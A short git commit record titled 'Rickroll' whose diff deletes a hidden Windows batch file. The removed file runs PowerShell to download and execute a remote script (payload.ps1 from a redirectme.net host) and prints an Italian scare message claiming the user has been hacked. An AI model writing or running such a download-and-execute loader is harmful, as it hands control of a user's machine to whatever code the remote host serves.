d3b7654bf111c77258e603ba1c8400993651e78b
leotecno09 <leotecno09@gmail.com>
2022-11-16 18:50:24 +0100

    Rickroll
    Rickroll

--- hidden/deep/rs/r.cmd
+++
@@ -1,6 +0,0 @@
-@ECHO OFF
-PowerShell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://leocraft.redirectme.net/payload.ps1')
-"
-PAUSE
-color a
-echo Ok ti ho hackerato ahahah NON CHIUDERE QUESTA FINESTRA O MORIRAI!!!
